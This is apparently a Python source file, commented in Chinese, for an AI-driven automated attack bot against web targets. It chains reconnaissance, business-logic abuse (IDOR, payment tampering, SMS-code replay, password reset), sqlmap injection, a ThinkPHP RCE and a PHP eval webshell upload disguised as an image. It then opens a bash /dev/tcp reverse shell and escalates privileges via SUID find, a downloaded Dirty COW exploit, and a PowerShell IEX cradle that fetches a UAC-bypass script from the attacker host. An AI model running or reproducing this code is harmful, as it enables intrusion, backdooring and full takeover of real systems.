import requests
import subprocess
import os
import urllib.parse
import base64
from ai_pentest_brain import AIPentestBrain
from log_utils import logger

class AutoPentestBot:
    def __init__(self, target_url, attack_ip, attack_port):
        self.target = target_url.rstrip("/")
        self.attack_ip = attack_ip
        self.attack_port = attack_port
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        # 关联AI决策中枢
        self.ai_brain = AIPentestBrain()
        # 初始化工具路径（文档中用到的Nmap/Subfinder等）
        self.tools_path = {
            "nmap": "/usr/bin/nmap",
            "sqlmap": "/usr/bin/sqlmap",
            "subfinder": "/usr/bin/subfinder"
        }

    def run_info_collection(self):
        """机器人自动信息收集（文档中全维度信息收集逻辑）"""
        logger.log_main(f"开始信息收集：{self.target}")
        info_result = {}
        # 1. 端口扫描（Nmap，文档基础网络信息）
        nmap_cmd = f"{self.tools_path['nmap']} -p 1-1000 {self.target} -oG nmap_result.txt"
        subprocess.run(nmap_cmd, shell=True, capture_output=True)
        with open("nmap_result.txt", "r") as f:
            info_result["ports"] = f.read()
        logger.log_main(f"Nmap扫描完成，结果已保存至nmap_result.txt")
        
        # 2. 子域枚举（Subfinder，文档子域信息）
        subfinder_cmd = f"{self.tools_path['subfinder']} -d {self.target.split('//')[1]} -silent"
        sub_result = subprocess.run(subfinder_cmd, shell=True, capture_output=True, text=True)
        info_result["subdomains"] = sub_result.stdout.strip().split("\n")
        logger.log_main(f"子域枚举完成，发现{len(info_result['subdomains'])}个子域")
        
        # 3. 敏感文件扫描（文档敏感信息泄露）
        sensitive_paths = ["/robots.txt", "/.gitignore", "/config.php", "/backup.zip", "/.env"]
        sensitive_files = []
        for path in sensitive_paths:
            try:
                res = requests.get(f"{self.target}{path}", headers=self.headers, timeout=3, verify=False)
                self.log_http("GET", f"{self.target}{path}", self.headers, response=res)
                if res.status_code == 200:
                    sensitive_files.append(f"{self.target}{path}")
            except:
                continue
        info_result["sensitive_files"] = sensitive_files
        logger.log_main(f"敏感文件扫描完成，发现{len(sensitive_files)}个敏感文件")
        
        # 输出信息报告（文档信息整合逻辑）
        self._save_info_report(info_result)
        return info_result

    def run_business_vuln_scan(self, login_cookie=None):
        """机器人新增：业务逻辑漏洞探测（文档中越权、支付绕开等功能）"""
        logger.log_main(f"开始业务逻辑漏洞扫描：{self.target}")
        business_results = []
        # 1. 水平越权探测（文档越权访问逻辑）
        if login_cookie:
            # 假设已登录用户A（cookie验证），尝试访问用户B的数据
            user_ids = [1, 2, 3, 4, 5]  # 模拟其他用户ID
            headers = self.headers.copy()
            headers["Cookie"] = login_cookie
            for user_id in user_ids:
                try:
                    url = f"{self.target}/api/user/info?id={user_id}"
                    res = requests.get(url, headers=headers, timeout=3, verify=False)
                    self.log_http("GET", url, headers, response=res)
                    if res.status_code == 200 and "user_info" in res.text:
                        business_results.append(f"水平越权：可访问用户{user_id}的信息（URL：{url}）")
                except:
                    continue
        
        # 2. 支付金额篡改探测（文档支付绕开逻辑）
        try:
            url = f"{self.target}/api/pay/submit"
            pay_data = {
                "order_id": "test_123",
                "amount": 0.01  # 正常金额100→篡改0.01
            }
            res = requests.post(url, json=pay_data, headers=self.headers, timeout=5, verify=False)
            self.log_http("POST", url, self.headers, pay_data, res)
            if "支付成功" in res.text and "0.01" in res.text:
                business_results.append(f"支付绕开：金额篡改成功（提交0.01元支付）")
        except:
            pass
        
        # 3. 验证码重放探测（文档验证码逻辑漏洞）
        try:
            # 第一步：获取验证码（假设返回code=1234）
            url = f"{self.target}/api/sms/send?phone=13800138000"
            get_code_res = requests.get(url, headers=self.headers, timeout=3, verify=False)
            self.log_http("GET", url, self.headers, response=get_code_res)
            verify_code = "1234"  # 模拟获取到的验证码
            
            # 第二步：重复使用该验证码请求重置密码
            reset_url = f"{self.target}/api/user/reset_pwd"
            reset_data = {"phone": "13800138000", "code": verify_code, "new_pwd": "test123"}
            for _ in range(2):  # 重复提交2次
                reset_res = requests.post(reset_url, json=reset_data, headers=self.headers, timeout=3, verify=False)
                self.log_http("POST", reset_url, self.headers, reset_data, reset_res)
                if "重置成功" in reset_res.text:
                    business_results.append(f"验证码重放：重复使用验证码{verify_code}重置密码成功")
                    break
        except:
            pass
        
        # 输出结果
        if business_results:
            logger.log_main(f"发现业务逻辑漏洞：")
            for res in business_results:
                logger.log_main(f"  - {res}")
            # 写入信息报告
            with open("info_report.md", "a", encoding="utf-8") as f:
                f.write(f"\n## 4. 业务逻辑漏洞\n" + "\n".join([f"- {r}" for r in business_results]))
        return business_results

    def run_vuln_exploit(self):
        """机器人执行漏洞利用（AI决策驱动，文档漏洞利用逻辑）"""
        logger.log_main(f"开始漏洞利用：{self.target}")
        # 1. 获取AI决策的漏洞类型+策略
        ai_decision = self.ai_brain.predict_vuln(self.target)
        vuln_type = ai_decision["vuln_type"]
        strategy = ai_decision["strategy"]
        if not strategy:
            logger.log_main(f"无{str(vuln_type)}的利用策略，跳过")
            return False
        
        # 2. 执行AI生成的绕防Payload
        raw_payload = strategy["payloads"][0]
        bypass_payload = self.ai_brain.generate_waf_bypass(self.target, raw_payload)
        logger.log_main(f"使用绕防Payload：{bypass_payload}")
        
        # 3. 按策略执行利用（文档中漏洞专属利用逻辑）
        if vuln_type == "SQL注入":
            # 调用sqlmap执行注入（文档SQL注入利用）
            sqlmap_cmd = f"{self.tools_path['sqlmap']} -u {self.target}?id={bypass_payload} --batch --dbs"
            logger.log_main(f"执行SQL注入命令：{sqlmap_cmd}")
            result = subprocess.run(sqlmap_cmd, shell=True, capture_output=True, text=True)
            if "available databases" in result.stdout:
                logger.log_main(f"{str(vuln_type)}利用成功，获取数据库列表")
                return True
        
        elif vuln_type == "ThinkPHP RCE":
            # 执行RCE Payload（文档框架RCE利用）
            url = f"{self.target}{strategy['paths'][0]}"
            res = requests.post(url, data=bypass_payload, headers=self.headers, timeout=5, verify=False)
            self.log_http("POST", url, self.headers, bypass_payload, res)
            if "root" in res.text or "www-data" in res.text:
                logger.log_main(f"{str(vuln_type)}利用成功，命令执行结果：{res.text.strip()}")
                # 自动反弹Shell（文档权限获取逻辑）
                self._send_reverse_shell(vuln_type, strategy["paths"][0])
                return True
        
        elif vuln_type == "文件上传":
            # 执行文件上传（文档文件上传绕防）
            upload_url = f"{self.target}{strategy['paths'][0]}"
            files = {"file": ("shell.phtml", "<?php @eval($_POST['shell']);?>", "image/jpeg")}
            res = requests.post(upload_url, files=files, headers=self.headers, timeout=5, verify=False)
            self.log_http("POST", upload_url, self.headers, "二进制文件", res)
            if "upload success" in res.text:
                logger.log_main(f"{str(vuln_type)}利用成功，后门地址：{upload_url}/shell.phtml")
                return True
        
        # 已知漏洞利用失败，执行AI模糊测试
        logger.log_main(f"{str(vuln_type)}利用失败，尝试AI模糊测试...")
        fuzz_payloads = self.ai_brain.generate_fuzz_payloads(vuln_type, raw_payload)
        for fuzz_p in fuzz_payloads:
            try:
                url = f"{self.target}?id={fuzz_p}"
                res = requests.get(url, headers=self.headers, timeout=3, verify=False)
                self.log_http("GET", url, self.headers, response=res)
                if res.status_code == 500 or "error" in res.text.lower():
                    logger.log_main(f"模糊测试发现异常：Payload={fuzz_p}，响应：{res.text[:50]}")
                    return True
            except:
                continue
        
        logger.log_main(f"{str(vuln_type)}利用失败")
        return False

    def run_privesc(self, shell_url, shell_pass):
        """机器人自动提权（文档Linux/Windows提权逻辑）"""
        logger.log_main(f"开始自动提权：{shell_url}")
        # 1. 执行提权信息收集（文档提权前置信息）
        privesc_info = self._get_privesc_info(shell_url, shell_pass)
        os_type = privesc_info["os_type"]
        logger.log_main(f"AI分析目标系统：{os_type}")
        
        # 2. 按系统类型执行提权（文档跨系统提权逻辑）
        if os_type == "Linux":
            # 检测SUID文件提权（文档SUID提权）
            suid_bins = self._exec_shell_cmd(shell_url, shell_pass, "find / -perm -4000 2>/dev/null | grep -E 'find|cp|awk'")
            if "usr/bin/find" in suid_bins:
                privesc_cmd = "find /tmp -exec /bin/sh -p \\; -quit && whoami"
                result = self._exec_shell_cmd(shell_url, shell_pass, privesc_cmd)
                if "root" in result:
                    logger.log_main(f"Linux SUID提权成功，当前用户：root")
                    return True
            
            # 检测内核漏洞提权（文档Dirty COW）
            kernel_ver = self._exec_shell_cmd(shell_url, shell_pass, "uname -r")
            if "4.4.0-" in kernel_ver and int(kernel_ver.split("-")[1].split(".")[0]) < 109:
                # 执行Dirty COW EXP
                self._exec_shell_cmd(shell_url, shell_pass, "wget -q https://github.com/FireFart/dirtycow/raw/master/dirtycow.c -O /tmp/dirtycow.c")
                self._exec_shell_cmd(shell_url, shell_pass, "gcc /tmp/dirtycow.c -o /tmp/dirtycow -pthread")
                result = self._exec_shell_cmd(shell_url, shell_pass, "/tmp/dirtycow && whoami")
                if "root" in result:
                    logger.log_main(f"Linux内核提权成功，当前用户：root")
                    return True
        
        elif os_type == "Windows":
            # Windows UAC绕过提权（文档UAC绕过）
            uac_cmd = "powershell IEX (New-Object System.Net.WebClient).DownloadString('http://{ip}/uac_bypass.ps1')".format(ip=self.attack_ip)
            result = self._exec_shell_cmd(shell_url, shell_pass, uac_cmd)
            if "NT AUTHORITY\\SYSTEM" in result:
                logger.log_main(f"Windows UAC提权成功，当前用户：SYSTEM")
                return True
        
        logger.log_main(f"提权失败")
        return False

    def _send_reverse_shell(self, vuln_type, path):
        """发送反弹Shell（文档权限获取逻辑）"""
        shell_cmd = f"bash -i >& /dev/tcp/{self.attack_ip}/{self.attack_port} 0>&1 &"
        if vuln_type == "ThinkPHP RCE":
            payload = self.ai_brain.generate_waf_bypass(self.target, shell_cmd)
            requests.post(f"{self.target}{path}", data=payload, headers=self.headers, timeout=5, verify=False)
        logger.log_main(f"反弹Shell已发送，攻击机监听：nc -lvp {self.attack_port}")

    def _exec_shell_cmd(self, shell_url, shell_pass, cmd):
        """通过WebShell执行命令（文档后渗透逻辑）"""
        data = {shell_pass: cmd}
        try:
            res = requests.post(shell_url, data=data, headers=self.headers, timeout=10, verify=False)
            self.log_http("POST", shell_url, self.headers, data, res)
            return res.text.strip()
        except:
            return ""

    def _get_privesc_info(self, shell_url, shell_pass):
        """收集提权所需信息（系统类型、内核版本等）"""
        info = {}
        # 判断操作系统类型
        os_res = self._exec_shell_cmd(shell_url, shell_pass, "uname -a || ver")
        if "Linux" in os_res:
            info["os_type"] = "Linux"
            info["kernel"] = self._exec_shell_cmd(shell_url, shell_pass, "uname -r")
        elif "Windows" in os_res:
            info["os_type"] = "Windows"
            info["version"] = os_res
        else:
            info["os_type"] = "Unknown"
        return info

    def _save_info_report(self, info_result):
        """保存信息收集报告（文档信息输出逻辑）"""
        report = f"# 目标信息收集报告\n"
        report += f"## 1. 基础端口信息\n{info_result['ports']}\n"
        report += f"## 2. 存活子域\n" + "\n".join(info_result["subdomains"]) + "\n"
        report += f"## 3. 敏感文件\n" + "\n".join(info_result["sensitive_files"]) + "\n"
        with open("info_report.md", "w", encoding="utf-8") as f:
            f.write(report)
        logger.log_main(f"信息报告已保存：info_report.md")

    def log_http(self, method, url, headers, data=None, response=None):
        """记录HTTP请求日志（调用日志工具）"""
        logger.log_http(method, url, headers, data, response)

if __name__ == "__main__":
    # 初始化机器人（输入目标+攻击机信息）
    bot = AutoPentestBot(
        target_url="http://test-target.com",
        attack_ip="192.168.1.100",
        attack_port=4444
    )
    # 执行全流程：信息收集→漏洞利用→提权
    bot.run_info_collection()
    bot.run_business_vuln_scan(login_cookie="user=test; session=xxx")
    if bot.run_vuln_exploit():
        # 假设获取WebShell后执行提权
        bot.run_privesc(shell_url="http://test-target.com/shell.phtml", shell_pass="shell")
